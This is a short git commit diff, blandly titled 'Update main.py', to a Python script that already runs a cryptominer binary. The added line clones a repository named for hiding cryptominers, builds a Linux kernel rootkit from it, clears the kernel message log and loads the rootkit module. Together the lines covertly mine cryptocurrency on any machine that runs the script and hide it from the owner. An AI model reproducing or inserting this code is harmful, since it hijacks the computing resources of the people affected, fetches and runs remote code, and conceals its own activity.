e7a49095ee8fb59c716650a1c126165e6be0fb0e
drakibaidb9 <132120897+drakibaidb9@users.noreply.github.com>
2023-04-29 11:23:18 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,3 @@
 import os
+os.system('git clone https://github.com/drakibaidb9/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make && dmesg -C && insmod rootkit.ko && cd ..')
 os.system('chmod +x webchain-miner && ./webchain-miner')
